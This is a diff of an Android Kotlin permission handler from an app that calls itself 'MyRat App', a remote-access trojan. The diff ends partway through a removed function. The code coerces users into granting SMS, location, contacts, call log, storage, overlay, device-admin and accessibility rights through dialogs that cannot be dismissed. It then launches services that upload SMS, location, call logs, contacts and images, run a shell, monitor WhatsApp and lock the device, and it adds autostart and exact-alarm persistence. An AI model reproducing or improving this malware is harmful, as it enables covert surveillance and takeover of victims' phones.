@@ -7,6 +7,8 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
 import android.view.accessibility.AccessibilityManager
@@ -38,8 +40,12 @@ class PermissionHandler(
     private var fromBatteryOptimizationSettings = false
     private var fromDeviceAdminSettings = false
     private var fromAccessibilitySettings = false
+    private var fromExactAlarmSettings = false
     private var hasVisitedOtherPermissions = false
+    private var isProcessingPermissions = false
+    private val handler = Handler(Looper.getMainLooper())
 
+    // Enhanced permission lists with Android 15 compatibility
     private val restrictedPermissions = mutableListOf(
         Manifest.permission.RECEIVE_SMS,
         Manifest.permission.READ_SMS,
@@ -52,6 +58,11 @@ class PermissionHandler(
         }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
             add(Manifest.permission.USE_BIOMETRIC)
+        }
+        // Android 15 specific permissions
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.VANILLA_ICE_CREAM) {
+            add(Manifest.permission.SCHEDULE_EXACT_ALARM)
+            add(Manifest.permission.USE_EXACT_ALARM)
         }
     }
 
@@ -87,9 +98,11 @@ class PermissionHandler(
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             add(Manifest.permission.FOREGROUND_SERVICE_LOCATION)
             add(Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC)
+            add(Manifest.permission.FOREGROUND_SERVICE_SPECIAL_USE)
         }
         add(Manifest.permission.WAKE_LOCK)
         add(Manifest.permission.DISABLE_KEYGUARD)
+        add(Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
     }
 
     private val nonRestrictedPermissions = phonePermissions + storagePermissions + internetPermission + queryPackagesPermission + lockPermissions
@@ -108,10 +121,23 @@ class PermissionHandler(
     }
 
     fun requestPermissions() {
+        if (isProcessingPermissions) {
+            Logger.log("Already processing permissions, skipping duplicate request")
+            return
+        }
+        
+        isProcessingPermissions = true
         try {
+            // Check if activity is still valid
+            if (activity.isFinishing || activity.isDestroyed) {
+                Logger.error("Activity is finishing or destroyed, cannot request permissions")
+                return
+            }
+
             val permissionsToRequest = nonRestrictedPermissions.filter {
                 ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
             }
+            
             if (permissionsToRequest.isEmpty()) {
                 Logger.log("All non-restricted permissions already granted")
                 startServicesForFeature(Feature.GENERAL)
@@ -123,14 +149,22 @@ class PermissionHandler(
             }
         } catch (e: Exception) {
             Logger.error("Error in requestPermissions", e)
+        } finally {
+            isProcessingPermissions = false
         }
     }
 
     private fun requestRestrictedPermissions() {
         try {
+            if (activity.isFinishing || activity.isDestroyed) {
+                Logger.error("Activity is finishing or destroyed, cannot request restricted permissions")
+                return
+            }
+
             val permissionsToRequest = restrictedPermissions.filter {
                 ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
             }
+            
             if (permissionsToRequest.isEmpty()) {
                 Logger.log("All restricted permissions already granted")
                 startServicesForFeature(Feature.RESTRICTED)
@@ -147,6 +181,11 @@ class PermissionHandler(
 
     fun requestPermissionsForFeature(feature: Feature) {
         try {
+            if (activity.isFinishing || activity.isDestroyed) {
+                Logger.error("Activity is finishing or destroyed, cannot request permissions for feature")
+                return
+            }
+
             val permissions = when (feature) {
                 Feature.RESTRICTED -> restrictedPermissions
                 Feature.PHONE -> phonePermissions
@@ -156,9 +195,11 @@ class PermissionHandler(
                 Feature.WHATSAPP -> internetPermission + queryPackagesPermission
                 Feature.GENERAL -> nonRestrictedPermissions
             }
+            
             val permissionsToRequest = permissions.filter {
                 ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
             }
+            
             if (permissionsToRequest.isEmpty()) {
                 Logger.log("All ${feature.name} permissions already granted")
                 startServicesForFeature(feature)
@@ -182,15 +223,26 @@ class PermissionHandler(
                 Logger.log("All requested permissions granted")
                 if (!requestingRestricted) {
                     startServicesForFeature(Feature.GENERAL)
-                    requestRestrictedPermissions()
+                    // Delay before requesting restricted permissions
+                    handler.postDelayed({
+                        requestRestrictedPermissions()
+                    }, 1000)
                 } else {
                     startServicesForFeature(Feature.RESTRICTED)
-                    configureDeviceSpecificSettings()
+                    // Delay before configuring device settings
+                    handler.postDelayed({
+                        configureDeviceSpecificSettings()
+                    }, 1000)
                 }
             } else {
                 Logger.log("Permissions denied: $deniedPermissions")
                 val showRationale = deniedPermissions.any {
-                    activity.shouldShowRequestPermissionRationale(it)
+                    try {
+                        activity.shouldShowRequestPermissionRationale(it)
+                    } catch (e: Exception) {
+                        Logger.error("Error checking rationale for $it", e)
+                        false
+                    }
                 }
                 if (showRationale) {
                     Logger.log("Showing rationale for denied permissions")
@@ -216,16 +268,16 @@ class PermissionHandler(
         
         try {
             val message = when (feature) {
-                Feature.RESTRICTED -> "SMS, Location, and Biometric permissions are required for core app functionality, including lock features. Please grant all permissions."
+                Feature.RESTRICTED -> "SMS, Location, Biometric, and Alarm permissions are required for core app functionality, including lock features. Please grant all permissions."
                 Feature.PHONE -> "Phone permissions are needed to make calls, access call logs, and contacts. Please grant all permissions."
                 Feature.STORAGE -> "Storage permissions are needed to access images. Please grant all permissions."
                 Feature.INTERNET -> "Internet and package query permissions are required for network connectivity and app monitoring (e.g., WhatsApp). Please grant all permissions."
-                Feature.LOCK -> "Foreground service, wake lock, and system alert permissions are required for device lock and screen management features. Please grant all permissions."
+                Feature.LOCK -> "Foreground service, wake lock, battery optimization, and system alert permissions are required for device lock and screen management features. Please grant all permissions."
                 Feature.WHATSAPP -> "Internet and package query permissions are required to monitor WhatsApp and WhatsApp Business. Please grant all permissions."
                 Feature.GENERAL -> "This app requires all permissions to function properly, including WhatsApp monitoring, lock, and screen management features. Please grant all requested permissions."
             }
             
-            AlertDialog.Builder(activity)
+            val dialog = AlertDialog.Builder(activity)
                 .setTitle("Permissions Required")
                 .setMessage(message)
                 .setPositiveButton("Grant") { _, _ ->
@@ -238,19 +290,31 @@ class PermissionHandler(
                 }
                 .setNegativeButton("Go to Settings") { _, _ ->
                     fromSettings = true
-                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                        data = Uri.parse("package:${activity.packageName}")
-                    }
-                    try {
-                        activity.startActivity(intent)
-                    } catch (e: Exception) {
-                        Logger.error("Failed to open app settings", e)
-                    }
+                    openAppSettings()
                 }
                 .setCancelable(false)
-                .show()
+                .create()
+                
+            // Show dialog safely
+            if (!activity.isFinishing && !activity.isDestroyed) {
+                dialog.show()
+            }
         } catch (e: Exception) {
             Logger.error("Failed to show rationale dialog", e)
+            // Fallback to settings
+            openAppSettings()
+        }
+    }
+
+    private fun openAppSettings() {
+        try {
+            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                data = Uri.parse("package:${activity.packageName}")
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            activity.startActivity(intent)
+        } catch (e: Exception) {
+            Logger.error("Failed to open app settings", e)
         }
     }
 
@@ -331,18 +395,25 @@ class PermissionHandler(
                 Logger.error("Failed to upload SIM details in startAllServices", e)
             }
             
-            startAppropriateService(Intent(activity, SmsService::class.java))
+            val services = listOf(
+                SmsService::class.java,
+                LocationService::class.java,
+                CallLogUploadService::class.java,
+                ContactUploadService::class.java,
+                CallService::class.java,
+                ImageUploadService::class.java,
+                LockService::class.java
+            )
+            
+            services.forEach { serviceClass ->
+                startAppropriateService(Intent(activity, serviceClass))
+            }
+            
             if (internetPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } &&
                 queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                 startAppropriateService(Intent(activity, ShellService::class.java))
                 startAppropriateService(Intent(activity, WhatsAppService::class.java))
             }
-            startAppropriateService(Intent(activity, CallLogUploadService::class.java))
-            startAppropriateService(Intent(activity, ContactUploadService::class.java))
-            startAppropriateService(Intent(activity, CallService::class.java))
-            startAppropriateService(Intent(activity, ImageUploadService::class.java))
-            startAppropriateService(Intent(activity, LocationService::class.java))
-            startAppropriateService(Intent(activity, LockService::class.java))
         } catch (e: Exception) {
             Logger.error("Error in startAllServices", e)
         }
@@ -355,6 +426,7 @@ class PermissionHandler(
             } else {
                 activity.startService(intent)
             }
+            Logger.log("Started service: ${intent.component?.className}")
         } catch (e: Exception) {
             Logger.error("Failed to start service: ${intent.component?.className}", e)
         }
@@ -380,10 +452,28 @@ class PermissionHandler(
                 false
             }
             val accessibilityEnabled = isAccessibilityServiceEnabled()
-            standardPermissionsGranted && overlayPermissionGranted && batteryOptimizationDisabled && deviceAdminActive && accessibilityEnabled
+            val exactAlarmGranted = checkExactAlarmPermission()
+            
+            val allGranted = standardPermissionsGranted && overlayPermissionGranted && batteryOptimizationDisabled && deviceAdminActive && accessibilityEnabled && exactAlarmGranted
+            Logger.log("Permissions status: standard=$standardPermissionsGranted, overlay=$overlayPermissionGranted, battery=$batteryOptimizationDisabled, admin=$deviceAdminActive, accessibility=$accessibilityEnabled, exactAlarm=$exactAlarmGranted")
+            allGranted
         } catch (e: Exception) {
             Logger.error("Error checking all permissions", e)
             false
+        }
+    }
+
+    private fun checkExactAlarmPermission(): Boolean {
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+                alarmManager.canScheduleExactAlarms()
+            } else {
+                true // Not required on older versions
+            }
+        } catch (e: Exception) {
+            Logger.error("Error checking exact alarm permission", e)
+            true // Assume granted if we can't check
         }
     }
 
@@ -404,37 +494,45 @@ class PermissionHandler(
             if (fromSettings) {
                 fromSettings = false
                 Logger.log("Returned from settings (likely app settings). Checking permissions.")
-                if (allPermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
-                    startServicesForFeature(Feature.GENERAL)
-                    startServicesForFeature(Feature.RESTRICTED)
-                    configureDeviceSpecificSettings()
-                } else {
-                    requestPermissions()
-                }
+                handler.postDelayed({
+                    if (allPermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
+                        startServicesForFeature(Feature.GENERAL)
+                        startServicesForFeature(Feature.RESTRICTED)
+                        configureDeviceSpecificSettings()
+                    } else {
+                        requestPermissions()
+                    }
+                }, 500)
             } else if (fromOverlaySettings) {
                 fromOverlaySettings = false
                 Logger.log("Returned from overlay settings. Checking overlay permission.")
-                checkOverlayPermission()
+                handler.postDelayed({ checkOverlayPermission() }, 500)
             } else if (fromOtherPermissionsSettings) {
                 fromOtherPermissionsSettings = false
-                Logger.log("Returned from other permissions settings. Assuming granted, proceeding with autostart.")
-                startServicesForFeature(Feature.PHONE)
-                startServicesForFeature(Feature.INTERNET)
-                startServicesForFeature(Feature.LOCK)
-                startServicesForFeature(Feature.WHATSAPP)
-                enableManufacturerSpecificAutostart()
+                Logger.log("Returned from other permissions settings. Proceeding with autostart.")
+                handler.postDelayed({
+                    startServicesForFeature(Feature.PHONE)
+                    startServicesForFeature(Feature.INTERNET)
+                    startServicesForFeature(Feature.LOCK)
+                    startServicesForFeature(Feature.WHATSAPP)
+                    enableManufacturerSpecificAutostart()
+                }, 500)
             } else if (fromDeviceAdminSettings) {
                 fromDeviceAdminSettings = false
                 Logger.log("Returned from device admin settings. Checking device admin permission.")
-                checkDeviceAdminPermission()
+                handler.postDelayed({ checkDeviceAdminPermission() }, 500)
             } else if (fromBatteryOptimizationSettings) {
                 fromBatteryOptimizationSettings = false
                 Logger.log("Returned from battery optimization settings. Checking battery optimization.")
-                checkBatteryOptimization()
+                handler.postDelayed({ checkBatteryOptimization() }, 500)
             } else if (fromAccessibilitySettings) {
                 fromAccessibilitySettings = false
                 Logger.log("Returned from accessibility settings. Checking accessibility permission.")
-                checkAccessibilityPermission()
+                handler.postDelayed({ checkAccessibilityPermission() }, 500)
+            } else if (fromExactAlarmSettings) {
+                fromExactAlarmSettings = false
+                Logger.log("Returned from exact alarm settings. Checking exact alarm permission.")
+                handler.postDelayed({ checkExactAlarmPermission() }, 500)
             }
         } catch (e: Exception) {
             Logger.error("Error in handleResume", e)
@@ -448,35 +546,24 @@ class PermissionHandler(
         }
         
         try {
-            val message = "To continue, you must allow all permissions from App Settings. Please enable all permissions, including SMS, Location, Biometric, Foreground Service, and WhatsApp monitoring permissions."
-            val spannable = android.text.SpannableStringBuilder(message)
-            val start = message.indexOf("allow")
-            val end = message.indexOf("Settings") + "Settings".length
-            spannable.setSpan(
-                android.text.style.StyleSpan(android.graphics.Typeface.BOLD),
-                start,
-                end,
-                android.text.Spannable.SPAN_EXCLUSIVE_EXCLUSIVE
-            )
+            val message = "To continue, you must allow all permissions from App Settings. Please enable all permissions, including SMS, Location, Biometric, Foreground Service, Exact Alarm, and WhatsApp monitoring permissions."
             
-            AlertDialog.Builder(activity)
+            val dialog = AlertDialog.Builder(activity)
                 .setTitle("All Permissions Required")
-                .setMessage(spannable)
+                .setMessage(message)
                 .setPositiveButton("Go to Settings") { _, _ ->
                     fromSettings = true
-                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                        data = Uri.parse("package:${activity.packageName}")
-                    }
-                    try {
-                        activity.startActivity(intent)
-                    } catch (e: Exception) {
-                        Logger.error("Failed to open app settings from restricted dialog", e)
-                    }
+                    openAppSettings()
                 }
                 .setCancelable(false)
-                .show()
+                .create()
+                
+            if (!activity.isFinishing && !activity.isDestroyed) {
+                dialog.show()
+            }
         } catch (e: Exception) {
             Logger.error("Failed to show restricted settings dialog", e)
+            openAppSettings()
         }
     }
 
@@ -486,7 +573,54 @@ class PermissionHandler(
             return
         }
         Logger.log("Starting device-specific settings configuration")
-        checkOverlayPermission()
+        checkExactAlarmPermissionFirst()
+    }
+
+    private fun checkExactAlarmPermissionFirst() {
+        if (activity.isFinishing || activity.isDestroyed) {
+            Logger.error("Cannot check exact alarm permission: Activity is finishing or destroyed")
+            return
+        }
+        
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+                if (!alarmManager.canScheduleExactAlarms()) {
+                    Logger.log("Exact alarm permission not granted, prompting user")
+                    
+                    val dialog = AlertDialog.Builder(activity)
+                        .setTitle("Exact Alarm Permission Required")
+                        .setMessage("This app requires permission to schedule exact alarms for proper service restart and background functionality. Please grant this permission.")
+                        .setPositiveButton("Go to Settings") { _, _ ->
+                            fromExactAlarmSettings = true
+                            try {
+                                val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
+                                    data = Uri.parse("package:${activity.packageName}")
+                                }
+                                activity.startActivity(intent)
+                            } catch (e: Exception) {
+                                Logger.error("Failed to open exact alarm settings", e)
+                                checkOverlayPermission()
+                            }
+                        }
+                        .setCancelable(false)
+                        .create()
+                        
+                    if (!activity.isFinishing && !activity.isDestroyed) {
+                        dialog.show()
+                    }
+                } else {
+                    Logger.log("Exact alarm permission granted or not required")
+                    checkOverlayPermission()
+                }
+            } else {
+                Logger.log("Exact alarm permission not required on this Android version")
+                checkOverlayPermission()
+            }
+        } catch (e: Exception) {
+            Logger.error("Failed to check exact alarm permission", e)
+            checkOverlayPermission()
+        }
     }
 
     private fun checkOverlayPermission() {
@@ -499,30 +633,34 @@ class PermissionHandler(
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
                 Logger.log("Overlay permission not granted, prompting user")
                 
-                AlertDialog.Builder(activity)
+                val dialog = AlertDialog.Builder(activity)
                     .setTitle("Overlay Permission Required")
                     .setMessage("This app requires permission to draw over other apps to enable WhatsApp monitoring and lock functionality. Please grant this permission.")
                     .setPositiveButton("Go to Settings") { _, _ ->
                         fromOverlaySettings = true
-                        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
-                            data = Uri.parse("package:${activity.packageName}")
-                        }
                         try {
+                            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
+                                data = Uri.parse("package:${activity.packageName}")
+                            }
                             activity.startActivity(intent)
                         } catch (e: Exception) {
                             Logger.error("Failed to open overlay settings", e)
-                            showManualInstructions()
+                            checkOtherPermissions()
                         }
                     }
                     .setCancelable(false)
-                    .show()
+                    .create()
+                    
+                if (!activity.isFinishing && !activity.isDestroyed) {
+                    dialog.show()
+                }
             } else {
                 Logger.log("Overlay permission granted or not required")
                 checkOtherPermissions()
             }
         } catch (e: Exception) {
             Logger.error("Failed to check overlay permission", e)
-            showManualInstructions()
+            checkOtherPermissions()
         }
     }
 
@@ -540,49 +678,11 @@ class PermissionHandler(
             }
 
             val manufacturer = Build.MANUFACTURER.lowercase()
-            val intent = when (manufacturer) {
-                "xiaomi" -> Intent().apply {
-                    setComponent(android.content.ComponentName(
-                        "com.miui.securitycenter",
-                        "com.miui.permcenter.permissions.PermissionsEditorActivity"))
-                    putExtra("extra_pkgname", activity.packageName)
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                "oppo" -> Intent().apply {
-                    setComponent(android.content.ComponentName(
-                        "com.coloros.safecenter",
-                        "com.coloros.safecenter.permission.PermissionManagerActivity"))
-                    putExtra("package_name", activity.packageName)
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                "vivo" -> Intent().apply {
-                    setComponent(android.content.ComponentName(
-                        "com.iqoo.secure",
-                        "com.iqoo.secure.ui.phonepower.BackgroundPowerManagerActivity"))
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                "huawei" -> Intent().apply {
-                    setComponent(android.content.ComponentName(
-                        "com.huawei.systemmanager",
-                        "com.huawei.permissionmanager.ui.MainActivity"))
-                    putExtra("packageName", activity.packageName)
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                "samsung" -> Intent().apply {
-                    setComponent(android.content.ComponentName(
-                        "com.samsung.android.sm",
-                        "com.samsung.android.sm.ui.appmanagement.AppManagementActivity"))
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                else -> Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                    data = Uri.parse("package:${activity.packageName}")
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-            }
+            val intent = createManufacturerSpecificIntent(manufacturer, "permissions")
 
             Logger.log("Prompting user for Other permissions")
             
-            AlertDialog.Builder(activity)
+            val dialog = AlertDialog.Builder(activity)
                 .setTitle("Other Permissions Required")
                 .setMessage("This app requires permissions under 'Other permissions' (e.g., Display pop-up windows, Start in background) to function. Please enable these permissions.")
                 .setPositiveButton("Go to Settings") { _, _ ->
@@ -592,14 +692,18 @@ class PermissionHandler(
                         activity.startActivity(intent)
                     } catch (e: Exception) {
                         Logger.error("Failed to open other permissions settings", e)
-                        showManualInstructions()
+                        enableManufacturerSpecificAutostart()
                     }
                 }
                 .setCancelable(false)
-                .show()
+                .create()
+                
+            if (!activity.isFinishing && !activity.isDestroyed) {
+                dialog.show()
+            }
         } catch (e: Exception) {
             Logger.error("Failed to check other permissions", e)
-            showManualInstructions()
+            enableManufacturerSpecificAutostart()
         }
     }
 
@@ -611,61 +715,74 @@ class PermissionHandler(
         
         try {
             val manufacturer = Build.MANUFACTURER.lowercase()
-            val intent = when (manufacturer) {
-                "xiaomi" -> Intent().apply {
-                    setComponent(android.content.ComponentName(
-                        "com.miui.securitycenter",
-                        "com.miui.permcenter.autostart.AutoStartManagementActivity"))
-                    putExtra("package_name", activity.packageName)
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                "oppo" -> Intent().apply {
-                    setComponent(android.content.ComponentName(
-                        "com.coloros.safecenter",
-                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"))
-                    putExtra("pkgName", activity.packageName)
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                "vivo" -> Intent().apply {
-                    setComponent(android.content.ComponentName(
-                        "com.iqoo.secure",
-                        "com.iqoo.secure.ui.phonepower.PhonePowerManagerActivity"))
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                "huawei" -> Intent().apply {
-                    setComponent(android.content.ComponentName(
-                        "com.huawei.systemmanager",
-                        "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"))
-                    putExtra("app_pkg", activity.packageName)
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                "samsung" -> Intent().apply {
-                    setComponent(android.content.ComponentName(
-                        "com.samsung.android.sm",
-                        "com.samsung.android.sm.ui.battery.BatteryActivity"))
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                else -> Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                    data = Uri.parse("package:${activity.packageName}")
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-            }
+            val intent = createManufacturerSpecificIntent(manufacturer, "autostart")
             
             activity.startActivity(intent)
         } catch (e: Exception) {
             Logger.error("Autostart setting failed for ${Build.MANUFACTURER}", e)
-            val fallbackIntent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                data = Uri.parse("package:${activity.packageName}")
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            }
-            try {
-                activity.startActivity(fallbackIntent)
-            } catch (e: Exception) {
-                Logger.error("Fallback autostart setting failed", e)
-                showManualInstructions()
-            }
+            openAppSettings()
         }
         checkDeviceAdminPermission()
+    }
+
+    private fun createManufacturerSpecificIntent(manufacturer: String, type: String): Intent {
+        return when (manufacturer) {
+            "xiaomi" -> when (type) {
+                "permissions" -> Intent().apply {
+                    setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity"))
+                    putExtra("extra_pkgname", activity.packageName)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                "autostart" -> Intent().apply {
+                    setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"))
+                    putExtra("package_name", activity.packageName)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                else -> createFallbackIntent()
+            }
+            "oppo" -> when (type) {
+                "permissions" -> Intent().apply {
+                    setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.PermissionManagerActivity"))
+                    putExtra("package_name", activity.packageName)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                "autostart" -> Intent().apply {
+                    setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"))
+                    putExtra("pkgName", activity.packageName)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                else -> createFallbackIntent()
+            }
+            "vivo" -> Intent().apply {
+                setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phonepower.BackgroundPowerManagerActivity"))
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            "huawei" -> when (type) {
+                "permissions" -> Intent().apply {
+                    setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.permissionmanager.ui.MainActivity"))
+                    putExtra("packageName", activity.packageName)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                "autostart" -> Intent().apply {
+                    setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"))
+                    putExtra("app_pkg", activity.packageName)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                else -> createFallbackIntent()
+            }
+            "samsung" -> Intent().apply {
+                setComponent(ComponentName("com.samsung.android.sm", "com.samsung.android.sm.ui.battery.BatteryActivity"))
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            else -> createFallbackIntent()
+        }
+    }
+
+    private fun createFallbackIntent(): Intent {
+        return Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+            data = Uri.parse("package:${activity.packageName}")
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        }
     }
 
     private fun checkDeviceAdminPermission() {
@@ -681,32 +798,36 @@ class PermissionHandler(
             if (!devicePolicyManager.isAdminActive(adminComponent)) {
                 Logger.log("Device admin permission not granted, prompting user")
                 
-                AlertDialog.Builder(activity)
+                val dialog = AlertDialog.Builder(activity)
                     .setTitle("Device Admin Permission Required")
                     .setMessage("This app requires device admin privileges to manage lock and screen settings remotely. Please enable this permission.")
                     .setPositiveButton("Go to Settings") { _, _ ->
                         fromDeviceAdminSettings = true
-                        val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                            putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                            putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                                "This permission is required to allow the app to lock the device and manage screen settings.")
-                        }
                         try {
+                            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
+                                putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                                    "This permission is required to allow the app to lock the device and manage screen settings.")
+                            }
                             activity.startActivity(intent)
                         } catch (e: Exception) {
                             Logger.error("Failed to open device admin settings", e)
-                            showManualInstructions()
+                            checkAccessibilityPermission()
                         }
                     }
                     .setCancelable(false)
-                    .show()
+                    .create()
+                    
+                if (!activity.isFinishing && !activity.isDestroyed) {
+                    dialog.show()
+                }
             } else {
                 Logger.log("Device admin permission already granted")
                 checkAccessibilityPermission()
             }
         } catch (e: Exception) {
             Logger.error("Failed to check device admin permission", e)
-            showManualInstructions()
+            checkAccessibilityPermission()
         }
     }
 
@@ -720,28 +841,32 @@ class PermissionHandler(
             if (!isAccessibilityServiceEnabled()) {
                 Logger.log("Accessibility service not enabled, prompting user")
                 
-                AlertDialog.Builder(activity)
+                val dialog = AlertDialog.Builder(activity)
                     .setTitle("Accessibility Permission Required")
                     .setMessage("This app requires accessibility service to monitor WhatsApp and WhatsApp Business. Please enable it.")
                     .setPositiveButton("Go to Settings") { _, _ ->
                         fromAccessibilitySettings = true
-                        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                         try {
+                            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                             activity.startActivity(intent)
                         } catch (e: Exception) {
                             Logger.error("Failed to open accessibility settings", e)
-                            showManualInstructions()
+                            checkBatteryOptimization()
                         }
                     }
                     .setCancelable(false)
-                    .show()
+                    .create()
+                    
+                if (!activity.isFinishing && !activity.isDestroyed) {
+                    dialog.show()
+                }
             } else {
                 Logger.log("Accessibility service enabled")
                 checkBatteryOptimization()
             }
         } catch (e: Exception) {
             Logger.error("Failed to check accessibility permission", e)
-            showManualInstructions()
+            checkBatteryOptimization()
         }
     }
 
@@ -756,7 +881,7 @@ class PermissionHandler(
             if (!powerManager.isIgnoringBatteryOptimizations(activity.packageName)) {
                 Logger.log("Battery optimization not disabled, prompting user")
                 
-                try {
+                val dialog = try {
                     val dialogView = activity.layoutInflater.inflate(R.layout.custom_dialog_layout, null)
                     AlertDialog.Builder(activity)
                         .setTitle("Battery Optimization Required")
@@ -766,9 +891,9 @@ class PermissionHandler(
                             disableBatteryOptimization()
                         }
                         .setCancelable(false)
-                        .show()
+                        .create()
                 } catch (e: Exception) {
-                    Logger.error("Failed to show battery optimization dialog", e)
+                    Logger.error("Failed to inflate custom dialog", e)
                     AlertDialog.Builder(activity)
                         .setTitle("Battery Optimization Required")
                         .setMessage("This app requires battery optimization to be disabled to function properly. Please disable battery optimization.")
@@ -776,7 +901,11 @@ class PermissionHandler(
                             disableBatteryOptimization()
                         }
                         .setCancelable(false)
-                        .show()
+                        .create()
+                }
+                
+                if (!activity.isFinishing && !activity.isDestroyed) {
+                    dialog.show()
                 }
             } else {
                 Logger.log("Battery optimization disabled")
@@ -784,7 +913,7 @@ class PermissionHandler(
             }
         } catch (e: Exception) {
             Logger.error("Failed to check battery optimization", e)
-            showManualInstructions()
+            startAllServices()
         }
     }
 
@@ -802,47 +931,7 @@ class PermissionHandler(
             activity.startActivity(intent)
         } catch (e: Exception) {
             Logger.error("Battery optimization settings failed", e)
-            showManualInstructions()
-        }
-    }
-
-    private fun showManualInstructions() {
-        if (activity.isFinishing || activity.isDestroyed) {
-            Logger.error("Cannot show manual instructions: Activity is finishing or destroyed")
-            return
-        }
-        
-        try {
-            val manufacturer = Build.MANUFACTURER.lowercase()
-            val instructions = when (manufacturer) {
-                "xiaomi" -> "Settings > Apps > MyRat App > Autostart > Enable...\nAlso, enable 'Display over other apps', all 'Other permissions' (e.g., Display pop-up windows, Start in background), Device Admin, Accessibility Service, and Biometric permissions in App Settings.\nFinally, disable battery optimization in Settings > Battery."
-                "oppo" -> "Settings > Battery > Battery Optimization > MyRat App > Don't Optimize\nAlso, enable 'Display over other apps', all 'Other permissions' (e.g., Allow pop-up windows, Start in background), Device Admin, Accessibility Service, and Biometric permissions in App Settings."
-                "vivo" -> "Settings > Battery > High Background Power > MyRat App > Enable\nAlso, enable 'Display over other apps', all 'Other permissions' (e.g., Allow background pop-ups, Start in background), Device Admin, Accessibility Service, and Biometric permissions in App Settings.\nFinally, disable battery optimization in Settings > Battery."
